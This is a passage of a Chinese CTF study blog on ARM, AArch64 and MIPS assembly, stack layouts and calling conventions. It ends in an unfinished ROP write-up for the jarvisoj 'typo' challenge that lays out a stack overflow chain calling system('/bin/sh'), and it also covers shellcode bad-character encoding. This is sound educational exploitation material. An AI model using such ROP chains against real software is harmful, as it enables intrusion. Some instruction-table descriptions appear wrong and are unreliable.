class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.data          &#x2F;* 数据段是在内存中动态创建的，所以它的在内存中的地址不可预测*&#x2F;</span><br><span class="line">var1: .word 3  &#x2F;* 内存中的第一个变量且赋值为3 *&#x2F;</span><br><span class="line">var2: .word 4  &#x2F;* 内存中的第二个变量且赋值为4 *&#x2F;</span><br><span class="line"></span><br><span class="line">.text          &#x2F;* 代码段开始 *&#x2F; </span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    ldr r0, adr_var1  @ 将存放var1值的地址adr_var1加载到寄存器R0中 </span><br><span class="line">    ldr r1, adr_var2  @ 将存放var2值的地址adr_var2加载到寄存器R1中 </span><br><span class="line">    ldr r2, [r0]      @ 将R0所指向地址中存放的0x3加载到寄存器R2中  </span><br><span class="line">    str r2, [r1]      @ 将R2中的值0x3存放到R1做指向的地址，此时，var2变量的值是0x3</span><br><span class="line">    bkpt        </span><br><span class="line"></span><br><span class="line">adr_var1: .word var1  &#x2F;* var1的地址助记符 *&#x2F;</span><br><span class="line">adr_var2: .word var2  &#x2F;* var2的地址助记符 *&#x2F;</span><br></pre></td></tr></table></figure><h3 id="立即数偏移寻址"><a href="#立即数偏移寻址" class="headerlink" title="立即数偏移寻址"></a>立即数偏移寻址</h3><p>接下来我们对这段代码进行反编译，结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ldr  r0, [ pc, #12 ]   ; 0x8088 &lt;adr_var1&gt;</span><br><span class="line">ldr  r1, [ pc, #12 ]   ; 0x808c &lt;adr_var2&gt;</span><br><span class="line">ldr  r2, [r0]</span><br><span class="line">str  r2, [r1]</span><br><span class="line">bx   lr</span><br></pre></td></tr></table></figure><p>此处，<code>[PC,#12]</code>的意义是<code>PC + 4*3</code>，可以看出，程序使用了偏移寻址的思路，但是，根据我们所写的汇编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_start:</span><br><span class="line">    ldr  r0, [ pc, #12 ]   ; &lt;- PC</span><br><span class="line">    ldr  r1, [ pc, #12 ]   </span><br><span class="line">    ldr  r2, [r0]</span><br><span class="line">    str  r2, [r1]</span><br><span class="line">    bx   lr       </span><br><span class="line"></span><br><span class="line">adr_var1: .word var1  </span><br><span class="line">adr_var2: .word var2</span><br></pre></td></tr></table></figure><p>我们若想获取var_1，应该为<code>PC + 4 * 5</code>才对，但是我们之前提过的，<strong>在程序执行中，ARM模式下的PC存储着当前指令加8(两条ARM指令后)的位置</strong>，也就是说，此时程序中的状况应该如下表所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_start:</span><br><span class="line">    ldr  r0, [ pc, #12 ]</span><br><span class="line">    ldr  r1, [ pc, #12 ]   </span><br><span class="line">    ldr  r2, [r0]          ; &lt;- PC</span><br><span class="line">    str  r2, [r1]</span><br><span class="line">    bx   lr       </span><br><span class="line"></span><br><span class="line">adr_var1: .word var1  </span><br><span class="line">adr_var2: .word var2</span><br></pre></td></tr></table></figure><p>这种形如<code>[Ri , num]</code>的方式被称为<strong>立即数作偏移寻址</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str r2, [r1, #2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加2所指向地址处。</span><br><span class="line">str r2, [r1, #4]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加4所指向地址处，之后R1寄存器中存储的值加4,也就是R1&#x3D;R1+4。</span><br><span class="line">ldr r3, [r1], #4  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中存储的值加4,也就是R1&#x3D;R1+4。</span><br></pre></td></tr></table></figure><h3 id="寄存器作偏移寻址"><a href="#寄存器作偏移寻址" class="headerlink" title="寄存器作偏移寻址"></a>寄存器作偏移寻址</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str r2, [r1, r2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处。R1寄存器不会被修改。 </span><br><span class="line">str r2, [r1, r2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处，之后R1寄存器中的值被更新,也就是R1&#x3D;R1+R2。</span><br><span class="line">ldr r3, [r1], r2  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1&#x3D;R1+R2。</span><br></pre></td></tr></table></figure><h3 id="寄存器缩放值作偏移寻址"><a href="#寄存器缩放值作偏移寻址" class="headerlink" title="寄存器缩放值作偏移寻址"></a>寄存器缩放值作偏移寻址</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str r2, [r1, r2, LSL#2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处。R1寄存器不会被修改。</span><br><span class="line">str r2, [r1, r2, LSL#2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处，之后R1寄存器中的值被更新,也就R1 &#x3D; R1 + R2&lt;&lt;2。</span><br><span class="line">ldr r3, [r1], r2, LSL#2  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1 &#x3D; R1 + R2&lt;&lt;2。</span><br></pre></td></tr></table></figure><h2 id="ARMEABI"><a href="#ARMEABI" class="headerlink" title="ARMEABI"></a>ARMEABI</h2><blockquote><p>未验证，感觉有点冲突</p></blockquote><p>前面介绍了arm 64位架构，armeabi 是 32 架构，指令也类似，只不过它的栈布局与常规 x86 的一样，<strong>R11和PC的值保存在栈底</strong>。<strong>R11充当ebp，PC充当RIP</strong> 。 LDMFD  SP!, {R11,PC} 指令即相当于 pop ebp;ret 的作用</p><p>例题：[inctf2018_wARMup](# inctf2018_wARMup)</p><h1 id="Arch64架构"><a href="#Arch64架构" class="headerlink" title="Arch64架构"></a>Arch64架构</h1><p>在ARMv8引入的一种全新架构。</p><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>AArch拥有31个通用寄存器，系统运行在64位状态下的时候名字叫 Xn ，运行在32位的时候就叫 Wn 。</p><table><thead><tr><th align="center">寄存器</th><th align="center">别名</th><th align="center">意义</th></tr></thead><tbody><tr><td align="center">SP</td><td align="center">–</td><td align="center">Stack Pointer:栈指针</td></tr><tr><td align="center">R30</td><td align="center">LR</td><td align="center">Link Register:在调用函数时候，保存下一条要执行指令的地址。</td></tr><tr><td align="center">R29</td><td align="center">FP</td><td align="center">Frame Pointer:保存函数栈的基地址。</td></tr><tr><td align="center">R19-R28</td><td align="center">–</td><td align="center">Callee-saved registers（含义见上面术语解释）</td></tr><tr><td align="center">R18</td><td align="center">–</td><td align="center">平台寄存器，有特定平台解释其用法。</td></tr><tr><td align="center">R17</td><td align="center">IP1</td><td align="center">The second intra-procedure-call temporary register……</td></tr><tr><td align="center">R16</td><td align="center">IP0</td><td align="center">The first intra-procedure-call temporary register……</td></tr><tr><td align="center">R9-R15</td><td align="center">–</td><td align="center">临时寄存器</td></tr><tr><td align="center">R8</td><td align="center">–</td><td align="center">在一些情况下，返回值是通过R8返回的</td></tr><tr><td align="center">R0-R7</td><td align="center">–</td><td align="center">在函数调用过程中传递参数和返回值</td></tr><tr><td align="center">NZCV</td><td align="center">–</td><td align="center">状态寄存器：N（Negative）负数 Z(Zero) 零 C(Carry) 进位 V(Overflow) 溢出</td></tr></tbody></table><h2 id="指令基本格式"><a href="#指令基本格式" class="headerlink" title="指令基本格式"></a>指令基本格式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Opcode&gt;&#123;&lt;Cond&gt;&#125;&lt;S&gt; &lt;Rd&gt;, &lt;Rn&gt; &#123;,&lt;Opcode2&gt;&#125;</span><br></pre></td></tr></table></figure><p>Opcode：操作码，也就是助记符，说明指令需要执行的操作类型。</p><p>Cond：指令执行条件码。</p><p>S：条件码设置项,决定本次指令执行是否影响PSTATE寄存器响应状态位值。</p><p>Rd/Xt：目标寄存器，A32指令可以选择R0-R14，T32指令大部分只能选择RO-R7，A64指令可以选择X0-X30。</p><p>Rn/Xn：第一个操作数的寄存器，和Rd一样，不同指令有不同要求。</p><p>Opcode2：第二个操作数，可以是立即数，寄存器Rm和寄存器移位方式（Rm，#shit）。</p><h2 id="内存操作指令-load-store"><a href="#内存操作指令-load-store" class="headerlink" title="内存操作指令-load/store"></a>内存操作指令-load/store</h2><p>在分析AArch64架构程序时，会发现我们找不到ARM中常见的STMFD/LDMFD命令，取而代之的是STP/LDP命令。</p><p>在ARM-v8指令集中，程序支持以下五种寻址方式：</p><ol><li>Base register only (no offset) ：基址寄存器无偏移。形如:<code>[ base &#123; , #0 &#125; ]</code>。</li><li>Base plus offset：基址寄存器加偏移。形如:<code>[ base &#123; , #imm &#125; ]</code>。</li><li>Pre-indexed：事先更新寻址，先变化后操作。形如:<code>[ base , #imm ]!</code>。⚠️：!符号表示则当数据传送完毕之后，将最后的地址写入基址寄存器，否则基址寄存器的内容不改变。</li><li>Post-indexed：事后更新寻址，先操作后变化。形如:<code>[ base ] , #imm</code>。</li><li>Literal (PC-relative): PC相对寻址。</li></ol><p>常见的Load/Store指令有：</p><p>LDR，LDRB，LDRSB，LDRH，LDRSW，STR，STRB，STRH</p><p>⚠️：此处R – Register(寄存器)、RB – Byte(字节-8bit)、SB – Signed Byte(有符号字节)、RH – Half Word(半字-16bit)、SW- Signed Word(带符号字-32bit)。</p><p>举例：</p><p><code>LDR X1 , [X2]</code>——将X2寄存器中的值赋给X1寄存器。</p><p><code>LDR X1 , [X2] ， #4</code>——将X2寄存器中的值赋给X1寄存器，然后X2寄存器中的值加4。</p><p>对于Load Pair/Store Pair这两个指令：从Memory地址addr处读取两个双字/字数据到目标寄存器Xt1，Xt2。</p><h2 id="与-amd-的变化"><a href="#与-amd-的变化" class="headerlink" title="与 amd 的变化"></a>与 amd 的变化</h2><blockquote><p>引用：<a href="https://blog.csdn.net/seaaseesa/article/details/105281585">:link:</a></p></blockquote><p>栈布局上和 amd 有比较大区别，这样一个程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">fun();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从 main 进入 fun 时，栈分布如下：</p><table><thead><tr><th align="center">内存地址</th><th align="left">内存中的数据</th><th align="left">备注</th><th align="center">所有者</th></tr></thead><tbody><tr><td align="center">低</td><td align="left">X29 value</td><td align="left">main 调用 fun 时的寄存器值</td><td align="center">fun</td></tr><tr><td align="center"></td><td align="left">X30 value</td><td align="left">同上</td><td align="center">fun</td></tr><tr><td align="center"></td><td align="left">buf</td><td align="left">fun 的局部变量</td><td align="center">fun</td></tr><tr><td align="center"></td><td align="left">X29 value</td><td align="left">上层函数调用main时的寄存器值</td><td align="center">main</td></tr><tr><td align="center">高</td><td align="left">X30 value</td><td align="left">同上</td><td align="center">main</td></tr></tbody></table><p><strong>x86 架构下的 rbp、rip 保存在栈低，aarch64 架构下保存在栈顶。</strong></p><p><strong>如果存在栈溢出，修改的上层函数的 rbp 和 rip（x29、x30）。</strong></p><h1 id="MIPS架构"><a href="#MIPS架构" class="headerlink" title="MIPS架构"></a>MIPS架构</h1><h2 id="mips、mipsel的区别"><a href="#mips、mipsel的区别" class="headerlink" title="mips、mipsel的区别"></a>mips、mipsel的区别</h2><p>mips是大端(big-endian)架构，而mipsel是小端(little-endian)架构。指令的用法是差不多的。</p><h2 id="寄存器-1"><a href="#寄存器-1" class="headerlink" title="寄存器"></a>寄存器</h2><p>各个寄存器表示的含义如下</p><table><thead><tr><th align="center">编号</th><th align="center">名称</th><th align="left">备注</th></tr></thead><tbody><tr><td align="center">$0</td><td align="center">$zero</td><td align="left">第0号寄存器，其值始终为0。</td></tr><tr><td align="center">$1</td><td align="center">$at</td><td align="left">保留寄存器</td></tr><tr><td align="center">$2-$3</td><td align="center">$v0-$v1</td><td align="left">values，保存表达式或函数返回结果</td></tr><tr><td align="center">$4-$7</td><td align="center">$a0-$a3</td><td align="left">argument，作为函数的前四个参数</td></tr><tr><td align="center">$8-$15</td><td align="center">$t0-$t7</td><td align="left">temporaries，供汇编程序使用的临时寄存器</td></tr><tr><td align="center">$16-$23</td><td align="center">$s0-$s7</td><td align="left">saved values，子函数使用时需先保存原寄存器的值</td></tr><tr><td align="center">$24-$25</td><td align="center">$t8-$t9</td><td align="left">temporaries，供汇编程序使用的临时寄存器，补充$t0-$t7。</td></tr><tr><td align="center">$26-$27</td><td align="center">$k0-$k1</td><td align="left">保留，中断处理函数使用</td></tr><tr><td align="center">$28</td><td align="center">$gp</td><td align="left">global pointer，全局指针</td></tr><tr><td align="center">$29</td><td align="center">$sp</td><td align="left">stack pointer，堆栈指针，指向堆栈的栈顶</td></tr><tr><td align="center">$30</td><td align="center">$fp</td><td align="left">frame pointer，保存栈指针</td></tr><tr><td align="center">$31</td><td align="center">$ra</td><td align="left">return address，返回地址</td></tr></tbody></table><p>三个特殊的寄存器： <code>PC</code> 即程序计数器； <code>HI</code> 即乘除结果高位寄存器； <code>LO</code> 即乘除结果低位寄存器。</p><h2 id="堆栈规则"><a href="#堆栈规则" class="headerlink" title="堆栈规则"></a>堆栈规则</h2><p>栈操作：向低地址增长，<strong>没有 EBP <strong>，进入一个函数，需要将当前栈指针向下移动 n bit ，当函数返回时才将栈指针加上偏移量恢复栈。</strong>由于不能随便移动栈指针，所以寄存器压栈和出栈都必需指定偏移量</strong>。</p><p>用 <code>$a0~$a3</code>传递函数的前 4 个参数，多余的参数用栈传递。函数返回值一般用 <code>$v0~$v1</code> 寄存器传递。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210207230503.png" alt="image-20210207230503396"></p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210207230327.png" alt="image-20210207230327624"></p><p>在 x86 架构中，使用 call 命令调用函数时，会先将当前执行位置压入堆栈，mips 的调用指令把函数的<strong>返回地址直接存入 $RA 寄存器</strong>而不是在堆栈中。</p><h2 id="函数调用的过程"><a href="#函数调用的过程" class="headerlink" title="函数调用的过程"></a>函数调用的过程</h2><blockquote><p>叶子函数：不再调用其他函数。非叶子函数相反。</p></blockquote><ol><li>A 函数调用 B 函数时，复制当前<code>$PC</code>的值到<code>$RA</code>寄存器，然后跳到子函数执行</li><li>到 B 函数时，如果为<strong>非叶子函数，则返回地址会先存入堆栈</strong>；</li><li>返回时，如果 B 函数为<strong>叶子函数，则<code>jr $ra</code>直接返回</strong>；非叶子函数先从堆栈取出返回地址，然后将返回地址放入 $RA ，再 <code>jr $ra</code> 。</li></ol><h2 id="ROP-chain"><a href="#ROP-chain" class="headerlink" title="ROP chain"></a>ROP chain</h2><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210208104045.png" alt="image-20210208104045076"><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210208104123.png" alt="image-20210208104123907"></p><h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><table><thead><tr><th align="center"><strong>指令</strong></th><th align="left"><strong>功能</strong></th><th align="left"><strong>应用实例</strong></th></tr></thead><tbody><tr><td align="center"><strong>J</strong></td><td align="left"><strong>直接跳转指令，跳转的地址在指令中</strong></td><td align="left"><strong>J name</strong></td></tr><tr><td align="center"><strong>JR</strong></td><td align="left"><strong>跳转到寄存器里的地址值指向的地方</strong></td><td align="left"><strong>JR R1</strong></td></tr><tr><td align="center"><strong>JAL</strong></td><td align="left"><strong>直接跳转指令，跳转的地址在指令中，跳转时，会将返回地址存入$ra寄存器</strong></td><td align="left"><strong>JAL R1 name</strong></td></tr><tr><td align="center"><strong>JALR</strong></td><td align="left"><strong>跳转到寄存器里的地址值指向的地方，跳转时，会将返回地址存入$ra寄存器</strong></td><td align="left"><strong>JALR R1</strong></td></tr><tr><td align="center">LB</td><td align="left">从存储器中读取一个字节的数据到寄存器中</td><td align="left">LB R1, 0(R2)</td></tr><tr><td align="center">LH</td><td align="left">从存储器中读取半个字的数据到寄存器中</td><td align="left">LH R1, 0(R2)</td></tr><tr><td align="center"><strong>LW</strong></td><td align="left"><strong>从存储器中读取一个字的数据到寄存器中</strong></td><td align="left"><strong>LW R1, 0(R2)</strong></td></tr><tr><td align="center">LD</td><td align="left">从存储器中读取双字的数据到寄存器中</td><td align="left">LD R1, 0(R2)</td></tr><tr><td align="center">L.S</td><td align="left">从存储器中读取单精度浮点数到寄存器中</td><td align="left">L.S R1, 0(R2)</td></tr><tr><td align="center">L.D</td><td align="left">从存储器中读取双精度浮点数到寄存器中</td><td align="left">L.D R1, 0(R2)</td></tr><tr><td align="center">LBU</td><td align="left">功能与LB指令相同，但读出的是不带符号的数据</td><td align="left">LBU R1, 0(R2)</td></tr><tr><td align="center">LHU</td><td align="left">功能与LH指令相同，但读出的是不带符号的数据</td><td align="left">LHU R1, 0(R2)</td></tr><tr><td align="center">LWU</td><td align="left">功能与LW指令相同，但读出的是不带符号的数据</td><td align="left">LWU R1, 0(R2)</td></tr><tr><td align="center"><strong>la</strong></td><td align="left"><strong>相当于x86的lea</strong></td><td align="left"></td></tr><tr><td align="center"><strong>lai</strong></td><td align="left"><strong>i的意思是immediate立即数，即后面的对象为立即数</strong></td><td align="left"></td></tr><tr><td align="center">SB</td><td align="left">把一个字节的数据从寄存器存储到存储器中</td><td align="left">SB R1, 0(R2)</td></tr><tr><td align="center">SH</td><td align="left">把半个字节的数据从寄存器存储到存储器中</td><td align="left">SH R1，0(R2)</td></tr><tr><td align="center"><strong>SW</strong></td><td align="left"><strong>把一个字的数据从寄存器存储到存储器中</strong></td><td align="left"><strong>SW R1, 0(R2)</strong></td></tr><tr><td align="center">SD</td><td align="left">把两个字节的数据从寄存器存储到存储器中</td><td align="left">SD R1, 0(R2)</td></tr><tr><td align="center">S.S</td><td align="left">把单精度浮点数从寄存器存储到存储器中</td><td align="left">S.S R1, 0(R2)</td></tr><tr><td align="center">S.D</td><td align="left">把双精度数据从存储器存储到存储器中</td><td align="left">S.D R1, 0(R2)</td></tr><tr><td align="center">DADD</td><td align="left">把两个定点寄存器的内容相加，也就是定点加</td><td align="left">DADD R1,R2,R3</td></tr><tr><td align="center">DADDI</td><td align="left">把一个寄存器的内容加上一个立即数</td><td align="left">DADDI R1,R2,#3</td></tr><tr><td align="center">DADDU</td><td align="left">不带符号的加</td><td align="left">DADDU R1,R2,R3</td></tr><tr><td align="center">DADDIU</td><td align="left">把一个寄存器的内容加上一个无符号的立即数</td><td align="left">DADDIU R1,R2,#3</td></tr><tr><td align="center">ADD.S</td><td align="left">把一个单精度浮点数加上一个双精度浮点数，结果是单精度浮点数</td><td align="left">ADD.S F0,F1,F2</td></tr><tr><td align="center">ADD.D</td><td align="left">把一个双精度浮点数加上一个单精度浮点数，结果是双精度浮点数</td><td align="left">ADD.D F0,F1,F2</td></tr><tr><td align="center">ADD.PS</td><td align="left">两个单精度浮点数相加，结果是单精度浮点数</td><td align="left">ADD.PS F0,F1,F2</td></tr><tr><td align="center">DSUB</td><td align="left">两个寄存器的内容相减，也就是定点数的减</td><td align="left">DSUB R1,R2,R3</td></tr><tr><td align="center">DSUBU</td><td align="left">不带符号的减</td><td align="left">DSUBU R1,R2,R3</td></tr><tr><td align="center">SUB.S</td><td align="left">一个双精度浮点数减去一个单精度浮点数，结果为单精度</td><td align="left">SUB.S F1,F2,F3</td></tr><tr><td align="center">SUB.D</td><td align="left">一个双精度浮点数减去一个单精度浮点数，结果为双精度浮点数</td><td align="left">SUB.D F1,F2,F3</td></tr><tr><td align="center">SUB.PS</td><td align="left">两个单精度浮点数相减</td><td align="left">SUB.SP F1,F2,F3</td></tr><tr><td align="center">DDIV</td><td align="left">两个定点寄存器的内容相除，也就是定点除</td><td align="left">DDIV Ｒ1,Ｒ2,Ｒ3</td></tr><tr><td align="center">DDIVU</td><td align="left">不带符号的除法运算</td><td align="left">DDIVU Ｒ1,Ｒ2,Ｒ3</td></tr><tr><td align="center">DIV.S</td><td align="left">一个双精度浮点数除以一个单精度浮点数，结果为单精度浮点数</td><td align="left">DIV.S F1,F2,F3</td></tr><tr><td align="center">DIV.D</td><td align="left">一个双精度浮点数除以一个单精度浮点数，结果为双精度浮点数</td><td align="left">DIV.D F1,F2,F3</td></tr><tr><td align="center">DIV.PS</td><td align="left">两个单精度浮点数相除，结果为单精度</td><td align="left">DIV.PS F1,F2,F3</td></tr><tr><td align="center">DMUL</td><td align="left">两个定点寄存器的内容相乘，也就是定点乘</td><td align="left">DMUL Ｒ1,Ｒ2,Ｒ3</td></tr><tr><td align="center">DMULU</td><td align="left">不带符号的乘法运算</td><td align="left">DMULU R1,R2,R3</td></tr><tr><td align="center">MUL.S</td><td align="left">一个双精度浮点数乘以一个单精度浮点数，结果为单精度浮点数</td><td align="left">DMUL.S F1,F2,F3</td></tr><tr><td align="center">MUL.D</td><td align="left">一个双精度浮点数乘以一个单精度浮点数，结果为双精度浮点数</td><td align="left">DMUL.D F1,F2,F3</td></tr><tr><td align="center">MUL.PS</td><td align="left">两个单精度浮点数相乘，结果为单精度浮点数</td><td align="left">DMUL.PS F1,F2,F3</td></tr><tr><td align="center">AND</td><td align="left">与运算，两个寄存器中的内容相与</td><td align="left">ANDＲ1,Ｒ2,Ｒ3</td></tr><tr><td align="center">ANDI</td><td align="left">一个寄存器中的内容与一个立即数相与</td><td align="left">ANDIＲ1,Ｒ2,#3</td></tr><tr><td align="center">OR</td><td align="left">或运算，两个寄存器中的内容相或</td><td align="left">ORＲ1,Ｒ2,Ｒ3</td></tr><tr><td align="center">ORI</td><td align="left">一个寄存器中的内容与一个立即数相或</td><td align="left">ORIＲ1,Ｒ2,#3</td></tr><tr><td align="center">XOR</td><td align="left">异或运算，两个寄存器中的内容相异或</td><td align="left">XORＲ1,Ｒ2,Ｒ3</td></tr><tr><td align="center">XORI</td><td align="left">一个寄存器中的内容与一个立即数异或</td><td align="left">XORIＲ1,Ｒ2,#3</td></tr><tr><td align="center">BEQZ</td><td align="left">条件转移指令，当寄存器中内容为0时转移发生</td><td align="left">BEQZ R1,0</td></tr><tr><td align="center">BENZ</td><td align="left">条件转移指令，当寄存器中内容不为0时转移发生</td><td align="left">BNEZ R1,0</td></tr><tr><td align="center">BEQ</td><td align="left">条件转移指令，当两个寄存器内容相等时转移发生</td><td align="left">BEQ R1,R2</td></tr><tr><td align="center">BNE</td><td align="left">条件转移指令，当两个寄存器中内容不等时转移发生</td><td align="left">BNE R1,R2</td></tr><tr><td align="center">MOV.S</td><td align="left">把一个单精度浮点数从一个浮点寄存器复制到另一个浮点寄存器</td><td align="left">MOV.S F0,F1</td></tr><tr><td align="center">MOV.D</td><td align="left">把一个双精度浮点数从一个浮点寄存器复制到另一个浮点寄存器</td><td align="left">MOV.D F0,F1</td></tr><tr><td align="center">MFC0</td><td align="left">把一个数据从通用寄存器复制到特殊寄存器</td><td align="left">MFC0 R1,R2</td></tr><tr><td align="center">MTC0</td><td align="left">把一个数据从特殊寄存器复制到通用寄存器</td><td align="left">MTC0 R1,R2</td></tr><tr><td align="center">MFC1</td><td align="left">把一个数据从定点寄存器复制到浮点寄存器</td><td align="left">MFC1 R1,F1</td></tr><tr><td align="center">MTC1</td><td align="left">把一个数据从浮点寄存器复制到定点寄存器</td><td align="left">MTC1 R1,F1</td></tr><tr><td align="center">LUI</td><td align="left">把一个16位的立即数填入到寄存器的高16位，低16位补零</td><td align="left">LUI R1,#42</td></tr><tr><td align="center">DSLL</td><td align="left">双字逻辑左移</td><td align="left">DSLL R1,R2,#2</td></tr><tr><td align="center">DSRL</td><td align="left">双字逻辑右移</td><td align="left">DSRL R1,R2,#2</td></tr><tr><td align="center">DSRA</td><td align="left">双字算术右移</td><td align="left">DSRA R1,R2,#2</td></tr><tr><td align="center">DSLLV</td><td align="left">可变的双字逻辑左移</td><td align="left">DSLLV R1,R2,#2</td></tr><tr><td align="center">DSRLV</td><td align="left">可变的双字罗伊右移</td><td align="left">DSRLV R1,R2,#2</td></tr><tr><td align="center">DSRAV</td><td align="left">可变的双字算术右移</td><td align="left">DSRAV R1,R2,#2</td></tr><tr><td align="center">SLT</td><td align="left">如果R2的值小于R3，那么设置R1的值为1，否则设置R1的值为0</td><td align="left">SLT R1,R2,R3</td></tr><tr><td align="center">SLTI</td><td align="left">如果寄存器R2的值小于立即数，那么设置R1的值为1，否则设置寄存器R1的值为0</td><td align="left">SLTI R1,R2,#23</td></tr><tr><td align="center">SLTU</td><td align="left">功能与SLT一致，但是带符号的</td><td align="left">SLTU R1,R2,R3</td></tr><tr><td align="center">SLTUI</td><td align="left">功能与SLT一致，但不带符号</td><td align="left">SLTUI R1,R2,R3</td></tr><tr><td align="center">MOVN</td><td align="left">如果第三个寄存器的内容为负，那么复制一个寄存器的内容到另外一个寄存器</td><td align="left">MOVN R1,R2,R3</td></tr><tr><td align="center">MOVZ</td><td align="left">如果第三个寄存器的内容为0，那么复制一个寄存器的内容到另外一个寄存器</td><td align="left">MOVZ R1,R2,R3</td></tr><tr><td align="center">TRAP</td><td align="left">根据地址向量转入管态</td><td align="left"></td></tr><tr><td align="center">ERET</td><td align="left">从异常中返回到用户态</td><td align="left"></td></tr><tr><td align="center">MADD.S</td><td align="left">一个双精度浮点数与单精度浮点数相乘加，结果为单精度</td><td align="left"></td></tr><tr><td align="center">MADD.D</td><td align="left">一个双精度浮点数与单精度浮点数相乘加，结果为双精度</td><td align="left"></td></tr><tr><td align="center">MADD.PS</td><td align="left">两个单精度浮点数相乘加，结果为单精度</td><td align="left"></td></tr></tbody></table><h2 id="shellcode-开发"><a href="#shellcode-开发" class="headerlink" title="shellcode 开发"></a>shellcode 开发</h2><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><p>有时 shellcode 内会含有 <code>\x00</code> ，换行，空格等坏字符，就造成输入或者复制等操作不能录入完整的 shellcode ，在坏字符处提前停止。</p><p>优化方法两种：指令优化和 shellcode 编码。指令优化就用无坏字符指令替代，重在积累。</p><p>编码算法主要是：BASE64、alpha_upper、xor，后两种比较容易实现常用。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210208204657.png" alt="image-20210208204657352"><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210208204713.png" alt="image-20210208204713414"></p><h1 id="入门实战"><a href="#入门实战" class="headerlink" title="入门实战"></a>入门实战</h1><h2 id="jarvisoj-typo"><a href="#jarvisoj-typo" class="headerlink" title="jarvisoj - typo"></a>jarvisoj - typo</h2><h3 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h3><p>只打开 nx 保护，静态链接程序，没有符号表。<code>qemu-arm ./typo</code> 启动看看，是个打字程序，打字界面存在溢出。</p><p>ida 加载后搜索字符串，发现有 /bin/sh 和 system 。用 rizzo 提取 libc 符号表后导入到程序还原出 system 地址。</p><p>找 gadget 第一个参数在 r0 ，下一条命令在 pc ，找到 gadget <code>pop_r0_r4_pc</code> 。栈布局如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">+-------------+</span><br><span class="line">|             |</span><br><span class="line">|  padding    |</span><br><span class="line">+-------------+</span><br><span class="line">|  padding    | &lt;- frame pointer</span><br><span class="line">+-------------+ </span><br><span class="line">|gadgets_addr | &lt;- return address</span><br><span class="line">+-------------+</span><br><span class="line">|binsh_addr   |</span><br><span class="line">+-------------+</span><br><span class="line">|junk_data    |</span><br><span class="line">+-------------+</span><br><span class="line">|system_addr  |</span><br><span 